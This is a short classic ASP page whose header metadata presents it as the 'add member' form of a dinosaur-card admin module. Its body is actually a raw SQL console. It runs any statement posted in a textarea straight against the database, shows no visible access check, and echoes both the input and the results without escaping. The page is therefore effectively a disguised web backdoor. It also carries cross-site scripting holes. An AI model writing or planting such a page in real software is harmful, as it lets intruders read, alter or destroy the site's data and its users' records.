<% Response.Expires = 0
HTProgCap="恐龍卡管理"
HTProgFunc="新增會員"
HTUploadPath="/public/"
HTProgCode="HT011"
HTProgPrefix="bDinoInfo" %>
<!--#Include virtual="/inc/server.inc" -->
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8;no-caches;">
<meta name="GENERATOR" content="Hometown Code Generator 2.0">
<meta name="ProgId" content="<%=HTprogPrefix%>Add.asp">
<title>新增表單</title>
<link rel="stylesheet" type="text/css" href="/inc/setstyle.css">
</head>
<!--#INCLUDE virtual="/inc/dbutil.inc" -->
<BODY>
<FORM method="POST">
QUERY: <TEXTAREA name="sql" rows=5 cols=60><%=request.form("sql")%></TEXTAREA>
<INPUT type=submit>
</FORM>
<HR>
<%
if request.form("sql") <> "" then
	set RS = conn.execute(request.form("sql"))

  if not RS.eof then
	response.write "<TABLE BORDER><TR class=eTableLable>"
	for i = 0 to RS.fields.count-1
		response.write "<TH>" & RS.fields(i).name
	next

	while not RS.eof

		response.write "<TR>"
		for i = 0 to RS.fields.count-1
			response.write "<TD>" & RS.fields(i)
		next

		
		RS.moveNext
	wend
	response.write "</TABLE>"
  end if
end if
%>
</body>
</html>